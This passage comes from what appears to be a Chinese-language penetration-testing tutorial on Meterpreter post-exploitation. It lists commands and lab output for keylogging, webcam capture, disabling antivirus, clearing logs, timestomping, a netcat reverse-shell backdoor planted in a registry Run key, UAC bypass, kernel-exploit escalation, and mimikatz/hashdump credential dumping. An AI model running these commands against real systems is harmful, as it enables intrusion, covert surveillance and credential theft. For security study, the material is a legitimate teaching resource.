class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 会话管理</span><br>background  <span class="hljs-comment">#将当前会话放置后台</span><br>sessions  <span class="hljs-comment"># 查看会话</span><br>sessions -i  <span class="hljs-comment"># 切换会话</span><br>quit  <span class="hljs-comment"># 关闭当前的会话，返回msf终端</span><br><br><span class="hljs-comment"># 系统设置</span><br>sysinfo  <span class="hljs-comment"># 查看目标机系统信息</span><br>idletime  <span class="hljs-comment"># 查看目标机闲置时间</span><br>reboot/shutdown   <span class="hljs-comment"># 重启/关机</span><br><br><span class="hljs-comment"># shell</span><br>shell  <span class="hljs-comment"># 获得控制台权限</span><br>irb  <span class="hljs-comment"># 进入ruby终端</span><br><br><span class="hljs-comment"># 进程迁移</span><br>getpid    <span class="hljs-comment"># 获取当前进程的pid</span><br>ps   <span class="hljs-comment"># 查看当前活跃进程</span><br>migrate &lt;pid值&gt;    <span class="hljs-comment">#将Meterpreter会话移植到指定pid值进程中</span><br><span class="hljs-built_in">kill</span> &lt;pid值&gt;   <span class="hljs-comment">#杀死进程</span><br>migrate &lt;pid值&gt;    <span class="hljs-comment">#将Meterpreter会话移植到指定pid值进程中</span><br><br><span class="hljs-comment"># 执行文件</span><br>execute <span class="hljs-comment">#在目标机中执行文件</span><br>execute -H -i -f cmd.exe <span class="hljs-comment"># 创建新进程cmd.exe，-H不可见，-i交互</span><br><br><span class="hljs-comment"># 摄像头命令</span><br>webcam_list  <span class="hljs-comment">#查看摄像头列表</span><br>webcam_chat  <span class="hljs-comment"># 查看摄像头接口</span><br>webcam_snap   <span class="hljs-comment">#通过摄像头拍照</span><br>webcam_stream   <span class="hljs-comment">#通过摄像头开启视频</span><br><br><span class="hljs-comment"># uictl开关键盘/鼠标</span><br>uictl [<span class="hljs-built_in">enable</span>/disable] [keyboard/mouse/all]  <span class="hljs-comment">#开启或禁止键盘/鼠标</span><br>uictl <span class="hljs-built_in">disable</span> mouse  <span class="hljs-comment">#禁用鼠标</span><br>uictl <span class="hljs-built_in">disable</span> keyboard  <span class="hljs-comment">#禁用键盘</span><br><br><span class="hljs-comment"># 远程桌面/截屏</span><br>enumdesktops  <span class="hljs-comment">#查看可用的桌面</span><br>getdesktop    <span class="hljs-comment">#获取当前meterpreter 关联的桌面</span><br>screenshot  <span class="hljs-comment">#截屏</span><br>use espia  <span class="hljs-comment">#或者使用espia模块截屏  然后输入screengrab</span><br>run vnc  <span class="hljs-comment">#使用vnc远程桌面连接</span><br><br><span class="hljs-comment"># 键盘记录</span><br>keyscan_start  <span class="hljs-comment">#开始键盘记录</span><br>keyscan_dump   <span class="hljs-comment">#导出记录数据</span><br>keyscan_stop <span class="hljs-comment">#结束键盘记录</span><br><br><span class="hljs-comment"># 添加用户，开启远程桌面</span><br><span class="hljs-comment"># 开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令</span><br>run post/windows/manage/enable_rdp  <span class="hljs-comment">#开启远程桌面</span><br>run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 <span class="hljs-comment">#添加用户</span><br>run post/windows/manage/enable_rdp FORWARD=<span class="hljs-literal">true</span> LPORT=6662  <span class="hljs-comment">#将3389端口转发到6662</span><br><br><span class="hljs-comment"># 关闭防病毒软件</span><br>run killav<br>run post/windows/manage/killav<br><br><span class="hljs-comment"># 修改注册表</span><br>reg –h <span class="hljs-comment"># 注册表命令帮助</span><br>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 <span class="hljs-comment">#上传nc</span><br>reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   <span class="hljs-comment">#枚举run下的key</span><br>reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d <span class="hljs-string">&#x27;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#x27;</span> <span class="hljs-comment">#设置键值</span><br>reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   <span class="hljs-comment">#查看键值</span><br>nc -v 192.168.81.162 443  <span class="hljs-comment">#攻击者连接nc后门</span><br><br><span class="hljs-comment"># 清理日志</span><br>clearav  <span class="hljs-comment">#清除windows中的应用程序日志、系统日志、安全日志</span><br></code></pre></td></tr></table></figure>

<h3 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span>/ls/cd/rm  <span class="hljs-comment"># 基本命令</span><br>search -f *pass* -d C:\\windows <span class="hljs-comment"># 搜索文件  -h查看帮助</span><br>getwd/pwd  <span class="hljs-comment"># 获取当前目录</span><br>getlwd/lpwd   <span class="hljs-comment"># 操作攻击者主机 查看当前目录</span><br>upload /tmp/hack.txt C:\\lltest <span class="hljs-comment"># 上传文件</span><br>download c:\\lltest\\lltestpasswd.txt /tmp/  <span class="hljs-comment"># 下载文件</span><br>edit c:\\1.txt  <span class="hljs-comment"># 编辑或创建文件  没有的话，会新建文件</span><br><span class="hljs-built_in">mkdir</span> lltest2  <span class="hljs-comment"># 只能在当前目录下创建文件夹</span><br><span class="hljs-built_in">rmdir</span> lltest2  <span class="hljs-comment"># 只能删除当前目录下文件夹</span><br>lcd /tmp   <span class="hljs-comment"># 操作攻击者主机 切换目录</span><br><br><span class="hljs-comment"># timestomp伪造文件时间戳</span><br>timestomp C:// -h   <span class="hljs-comment">#查看帮助</span><br>timestomp -v C://2.txt   <span class="hljs-comment">#查看时间戳</span><br>timestomp C://2.txt -f C://1.txt <span class="hljs-comment">#将1.txt的时间戳复制给2.txt</span><br></code></pre></td></tr></table></figure>

<h3 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 基本</span><br>ipconfig/ifconfig<br>netstat –ano<br>arp<br>getproxy   <span class="hljs-comment">#查看代理信息</span><br>route   <span class="hljs-comment">#查看路由</span><br><br><span class="hljs-comment"># portfwd端口转发</span><br>portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="hljs-comment"># 将目标机的3389端口转发到本地6666端口</span><br>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 <span class="hljs-comment">#然后使用rdesktop来连接，-u 用户名 -p 密码</span><br><br><br><span class="hljs-comment"># 添加路由</span><br><br><span class="hljs-comment"># 方式一autoroute （deprecated）</span><br>run autoroute –h <span class="hljs-comment">#查看帮助</span><br>run autoroute -s 192.168.2.0/24  <span class="hljs-comment">#添加到目标环境网络</span><br>run autoroute –p  <span class="hljs-comment">#查看添加的路由</span><br><br><span class="hljs-comment"># 方式二post/multi/manage/autoroute</span><br>run post/multi/manage/autoroute CMD=autoadd <span class="hljs-comment">#自动添加到目标环境网络</span><br>run post/multi/manage/autoroute CMD=<span class="hljs-built_in">print</span> <span class="hljs-comment"># 查看添加的路由</span><br>(Specify the autoroute <span class="hljs-built_in">command</span> (Accepted: add, autoadd, <span class="hljs-built_in">print</span>, delete, default))<br><br><span class="hljs-comment"># 然后可以利用arp_scanner、portscan等进行存活检测</span><br>run arp_scanner -r 192.168.2.0/24<br>run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24<br>run auxiliary/scanner/portscan/tcp RHOSTS=192.168.2.0<br><br><span class="hljs-comment"># autoroute添加完路由后，还可以利用msf自带的模块进行socks代理</span><br><span class="hljs-comment"># msf提供了2个模块用来做socks代理。</span><br><span class="hljs-comment"># auxiliary/server/socks_proxy</span><br><span class="hljs-comment"># use auxiliary/server/socks_unc</span><br><span class="hljs-comment"># 先background退出来，然后：</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">set</span> srvhost 127.0.0.1<br><span class="hljs-built_in">set</span> srvport 1080<br>run<br><br><span class="hljs-comment"># 然后vi /etc/proxychains.conf #添加 socks5 127.0.0.1 1080</span><br><span class="hljs-comment"># 最后proxychains 使用Socks5代理访问</span><br><br><span class="hljs-comment"># sniffer抓包</span><br>use sniffer<br>sniffer_interfaces   <span class="hljs-comment">#查看网卡</span><br>sniffer_start 2   <span class="hljs-comment">#选择网卡 开始抓包</span><br>sniffer_stats 2   <span class="hljs-comment">#查看状态</span><br>sniffer_dump 2 /tmp/lltest.pcap  <span class="hljs-comment">#导出pcap数据包</span><br>sniffer_stop 2   <span class="hljs-comment">#停止抓包</span><br></code></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 信息收集的脚本位于：</span><br><span class="hljs-comment"># modules/post/windows/gather</span><br><span class="hljs-comment"># modules/post/linux/gather</span><br><span class="hljs-comment"># 以下列举一些常用的</span><br>run post/windows/gather/checkvm <span class="hljs-comment">#是否虚拟机</span><br>run post/linux/gather/checkvm <span class="hljs-comment">#是否虚拟机</span><br>run post/windows/gather/forensics/enum_drives <span class="hljs-comment">#查看分区</span><br>run post/windows/gather/enum_applications <span class="hljs-comment">#获取安装软件信息</span><br>run post/windows/gather/dumplinks   <span class="hljs-comment">#获取最近的文件操作</span><br>run post/windows/gather/enum_ie  <span class="hljs-comment">#获取IE缓存</span><br>run post/windows/gather/enum_chrome   <span class="hljs-comment">#获取Chrome缓存</span><br>run post/windows/gather/enum_patches  <span class="hljs-comment">#补丁信息</span><br>run post/windows/gather/enum_domain  <span class="hljs-comment">#查找定位域控</span><br>run post/windows/gather/enum_logged_on_users  <span class="hljs-comment">#登录过的用户</span><br></code></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>1.getsystem提权<br>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">getsystem  <br></code></pre></td></tr></table></figure>

<p>2.bypassuac<br>用户帐户控制（UAC）是微软在 Windows Vista 以后版本引入的一种安全机制，有助于防止对系统进行未经授权的更改。应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员专门给系统授予管理员级别的访问权限。UAC 可以阻止未经授权的应用程序进行自动安装，并防止无意中更改系统设置。</p>
<p>msf提供了如下几个模块帮助绕过UAC：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 auxiliary(server/socks5) &gt; search bypassuac<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                              Disclosure Date  Rank       Check  Description</span><br>   -  ----                                              ---------------  ----       -----  -----------<br>   0  exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass<br>   1  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)<br>   2  exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)<br>   3  exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)<br>   4  exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)<br>   5  exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS<br>   6  exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)<br>   7  exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)<br></code></pre></td></tr></table></figure>

<p>使用方法类似，运行后返回一个新的会话，<strong>需要再次执行getsystem获取系统权限</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 示例</span><br>meterpreter &gt; getuid<br>Server username: SAUCERMAN\TideSec<br>meterpreter &gt; background<br>[*] Backgrounding session 4...<br>msf5 exploit(multi/handler) &gt;  use exploit/windows/local/bypassuac<br>msf5 exploit(windows/local/bypassuac) &gt; <span class="hljs-built_in">set</span> SESSION 4<br>SESSION =&gt; 4<br>msf5 exploit(windows/local/bypassuac) &gt; run<br><br>[-] Handler failed to <span class="hljs-built_in">bind</span> to 192.168.81.160:4444:-  -<br>[-] Handler failed to <span class="hljs-built_in">bind</span> to 0.0.0.0:4444:-  -<br>[*] UAC is Enabled, checking level...<br>[+] UAC is <span class="hljs-built_in">set</span> to Default<br>[+] BypassUAC can bypass this setting, continuing...<br>[+] Part of Administrators group! Continuing...<br>[*] Uploaded the agent to the filesystem....<br>[*] Uploading the bypass UAC executable to the filesystem...<br>[*] Meterpreter stager executable 73802 bytes long being uploaded..<br>[*] Sending stage (206403 bytes) to 192.168.81.154<br>[*] Meterpreter session 5 opened (192.168.81.160:4444 -&gt; 192.168.81.154:1134) at 2019-06-12 06:31:11 -0700<br>[-] Exploit failed [timeout-expired]: Timeout::Error execution expired<br>[*] Exploit completed, but no session was created.<br><br><span class="hljs-comment"># 然后返回新的meterpreter会话，继续执行getsystem本应该会提权成功</span><br><span class="hljs-comment"># 然鹅这里失败了</span><br></code></pre></td></tr></table></figure>

<p>3.内核漏洞提权</p>
<p>无论是linux还是windows都出过很多高危的漏洞，我们可以利用它们进行权限提升，比如windows系统的ms13-081、ms15-051、ms16-032、ms17-010等，msf也集成了这些漏洞的利用模块。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; run post/windows/gather/enum_patches  <span class="hljs-comment">#查看补丁信息</span><br>msf5 &gt; use exploit/windows/local/ms13_053_schlamperei<br>msf5 &gt; <span class="hljs-built_in">set</span> SESSION 2<br>msf5 &gt; exploit<br><br><span class="hljs-comment"># 示例</span><br>meterpreter &gt; run post/windows/gather/enum_patches<br><br>[+] KB2871997 is missing<br>[+] KB2928120 is missing<br>[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d <span class="hljs-keyword">if</span> Windows 2K SP4 - Windows 7 (x86)<br>[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator <span class="hljs-keyword">if</span> Vista, 7, and 2008<br>[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf <span class="hljs-keyword">if</span> XP SP2/SP3 Win 2k3 SP2<br>[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity<br>[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei <span class="hljs-keyword">if</span> x86 Win7 SP0/SP1<br>[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu <span class="hljs-keyword">if</span> x86 Windows 7 SP0/SP1<br>meterpreter &gt; background<br>[*] Backgrounding session 4...<br>msf5 exploit(windows/local/bypassuac) &gt; search MS13-081<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                             Disclosure Date  Rank     Check  Description</span><br>   -  ----                                             ---------------  ----     -----  -----------<br>   0  exploit/windows/local/ms13_081_track_popup_menu  2013-10-08       average  Yes    Windows TrackPopupMenuEx Win32k NULL Page<br><br><br>msf5 exploit(windows/local/bypassuac) &gt; use exploit/windows/local/ms13_081_track_popup_menu<br>msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; <span class="hljs-built_in">set</span> session 4<br>session =&gt; 4<br>msf5 exploit(windows/local/ms13_081_track_popup_menu) &gt; exploit<br><br>[!] SESSION may not be compatible with this module.<br>[-] Handler failed to <span class="hljs-built_in">bind</span> to 192.168.81.160:4444:-  -<br>[-] Handler failed to <span class="hljs-built_in">bind</span> to 0.0.0.0:4444:-  -<br>[-] Exploit aborted due to failure: no-target: Running against 64-bit systems is not supported<br>[*] Exploit completed, but no session was created.<br><span class="hljs-comment"># 然鹅失败了，摸摸头</span><br></code></pre></td></tr></table></figure>

<h3 id="获取凭证"><a href="#获取凭证" class="headerlink" title="获取凭证"></a>获取凭证</h3><p>在内网环境中，一个管理员可能管理多台服务器，他使用的密码有可能相同或者有规律，如果能够得到密码或者hash，再尝试登录内网其它服务器，可能取得意想不到的效果。</p>
<p>1.使用mimikatz</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">load mimikatz    <span class="hljs-comment">#help mimikatz 查看帮助</span><br>wdigest  <span class="hljs-comment">#获取Wdigest密码</span><br>mimikatz_command -f samdump::hashes  <span class="hljs-comment">#执行mimikatz原始命令</span><br>mimikatz_command -f sekurlsa::searchPasswords<br><br><span class="hljs-comment"># 示例</span><br>meterpreter &gt; load mimikatz<br>Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to <span class="hljs-string">&#x27;load kiwi&#x27;</span> instead?<br>Success.<br>meterpreter &gt; wdigest<br>[!] Not currently running as SYSTEM<br>[*] Attempting to getprivs ...<br>[+] Got SeDebugPrivilege.<br>[*] Retrieving wdigest credentials<br>wdigest credentials<br>===================<br><br>AuthID    Package    Domain        User           Password<br>------    -------    ------        ----           --------<br>0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE  <br>0;996     Negotiate  WORKGROUP     SAUCERMAN$     <br>0;48748   NTLM                                    <br>0;999     NTLM       WORKGROUP     SAUCERMAN$     <br>0;476238  NTLM       SAUCERMAN     TideSec        123456<br>0;476209  NTLM       SAUCERMAN     TideSec        123456<br><br>meterpreter &gt; mimikatz_command -f samdump::hashes<br>Ordinateur : saucerman<br>BootKey    : 691cff33caf49e933be97fcee370256a<br>RegOpenKeyEx SAM : (0x00000005) �ݿ� <br>Erreur lors de l<span class="hljs-string">&#x27;exploration du registre</span><br><span class="hljs-string">meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="hljs-string">[0] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br><span class="hljs-string">[1] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br><span class="hljs-string">[2] &#123; SAUCERMAN ; TideSec ; 123456 &#125;</span><br><span class="hljs-string">[3] &#123; SAUCERMAN ; TideSec ; 123456 &#125;</span><br><span class="hljs-string">[4] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br><span class="hljs-string">[5] &#123; TideSec ; SAUCERMAN ; 123456 &#125;</span><br></code></pre></td></tr></table></figure>

<ol>
<li>使用meterpreter的run hashdump命令</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; run hashdump<br><br>[!] Meterpreter scripts are deprecated. Try post/windows/gather/smart_hashdump.<br>[!] Example: run post/windows/gather/smart_hashdump OPTION=value [...]<br>[*] Obtaining the boot key...<br>[*] Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...<br>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:134: warning: constant OpenSSL::Cipher::Cipher is deprecated<br>[*] Obtaining the user list and keys...<br>[*] Decrypting user keys...<br>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:268: warning: constant OpenSSL::Cipher::Cipher is deprecated<br>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:272: warning: constant OpenSSL::Cipher::Cipher is deprecated<br>/opt/metasploit-framework/embedded/framework/lib/rex/script/base.rb:279: warning: constant OpenSSL::Cipher::Cipher is deprecated<br>[*] Dumping password hints...<br><br>TideSec:<span class="hljs-string">&quot;123456&quot;</span><br><br>[*] Dumping password hashes...<br><br><br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::<br></code></pre></td></tr></table></figure>

<p>3.post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</p>
<p>从上面也可以看出官方推荐<code>post/windows/gather/smart_hashdump</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; run post/windows/gather/smart_hashdump<br><br>[*] Running module against SAUCERMAN<br>[*] Hashes will be saved to the database <span class="hljs-keyword">if</span> one is connected.<br>[+] Hashes will be saved <span class="hljs-keyword">in</span> loot <span class="hljs-keyword">in</span> JtR password file format to:<br>[*] /home/ubuntu/.msf4/loot/20190612084715_default_192.168.81.154_windows.hashes_439550.txt<br>[*] Dumping password hashes...<br>[*] Running as SYSTEM extracting hashes from registry<br>[*]     Obtaining the boot key...<br>[*]     Calculating the hboot key using SYSKEY 691cff33caf49e933be97fcee370256a...<br>[*]     Obtaining the user list and keys...<br>[*]     Decrypting user keys...<br>[*]     Dumping password hints...<br>[+]     TideSec:<span class="hljs-string">&quot;123456&quot;</span><br>[*]     Dumping password hashes...<br>[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>[+]     TideSec:1000:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::<br></code></pre></td></tr></table></figure>

<p>4.powerdump<br>同 hashdump，但失败了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">meterpreter &gt; run powerdump<br>[*] PowerDump v0.1 - PowerDump to extract Username and Password Hashes...<br>[*] Running PowerDump to extract Username and Password Hashes...<br>[*] Uploaded PowerDump as 69921.ps1 to %TEMP%...<br>[*] Setting ExecutionPolicy to Unrestricted...<br>[*] Dumping the SAM database through PowerShell...<br><br>[-] Could not execute powerdump: Rex::Post::Meterpreter::RequestError core_channel_open: Operation failed: The system cannot find the file specified.<br></code></pre></td></tr></table></figure>

<h3 id="假冒令牌"><a href="#假冒令牌" class="headerlink" title="假冒令牌"></a>假冒令牌</h3><p>在用户登录windows操作系统时，系统都会给用户分配一个令牌(Token)，当用户访问系统资源时都会使用这个令牌进行身份验证，功能类似于网站的session或者cookie。</p>
<p>msf提供了一个功能模块可以让我们假冒别人的令牌，实现身份切换，如果目标环境是域环境，刚好域管理员登录过我们已经有权限的终端，那么就可以假冒成域管理员的角色。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.incognito假冒令牌</span><br>use incognito      <span class="hljs-comment">#help incognito  查看帮助</span><br>list_tokens -u    <span class="hljs-comment">#查看可用的token</span><br>impersonate_token <span class="hljs-string">&#x27;NT AUTHORITY\SYSTEM&#x27;</span>  <span class="hljs-comment">#假冒SYSTEM token</span><br>或者impersonate_token NT\ AUTHORITY\\SYSTEM <span class="hljs-comment">#不加单引号 需使用\\</span><br>execute -f cmd.exe -i –t    <span class="hljs-comment"># -t 使用假冒的token 执行</span><br>或者直接shell<br>rev2self   <span class="hljs-comment">#返回原始token</span><br><br><span class="hljs-comment"># 